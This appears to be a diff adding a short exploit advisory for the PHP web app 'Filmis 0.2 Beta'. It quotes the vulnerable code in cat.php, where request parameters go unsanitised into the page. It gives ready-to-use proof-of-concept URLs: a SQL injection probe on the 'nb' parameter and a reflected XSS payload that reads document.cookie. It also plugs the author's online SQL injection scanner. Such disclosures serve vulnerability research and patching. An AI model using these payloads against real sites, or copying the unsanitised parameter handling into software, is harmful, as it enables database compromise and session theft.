@@ -1,0 +1,78 @@
+===================================================================================
+
+ Filmis - Version 0.2 Beta SQL Injection and XSS Vulnerabilities
+
+===================================================================================
+
+# Exploit Title: Filmis - Version 0.2 Beta SQL Injection and XSS Vulnerabilities
+
+# Author: M.Jock3R 
+
+# USE MY ONLINE SQLI SCAN TOOL[CODED By ME] : http://dzcode.tk/sql.php (To discover that such exploit) 
+
+# Download Script(Official site): http://mohshow.fr.cr/forum/downloads/filmis-0.2beta.zip
+
+# Category:: webapps
+
+# Tested on: windows XP Sp2 FR
+
+  
+
+===================================================================================
+
+ 
+
+Vuln file : cat.php
+
+  
+
+Vuln Code :
+
+---------- 
+
+$idcat = $_GET['id'];
+
+$nbitemparpage= "28";
+
+if(@$_GET['nb']=="") { $nb = "1"; } else { $nb = $_GET['nb']; }
+
+$nbd = ceil(($nb -1) * $nbitemparpage);
+
+$amem = mysql_query("SELECT * FROM ".$prefix."film");
+
+         
+
+Exploit:
+
+---------
+
+1/SQL INJECTION :
+
+http://localhost/filmis/cat.php?nb=-1'
+
+
+
+2/XSS :
+
+http://localhost/filmis/cat.php?nb=1><script>alert(document.cookie)</script>
+
+ 
+
+===================================================================================
+
+Greets To :
+
+adelsbm / attiadona  / Wprojects.tk
+
+
+
+Email : madrido.jocker@gmail.com
+
+  
+
+THANKS TO ALL ALGERIANS HACK3RS
+
+===================================================================================
+
+
+
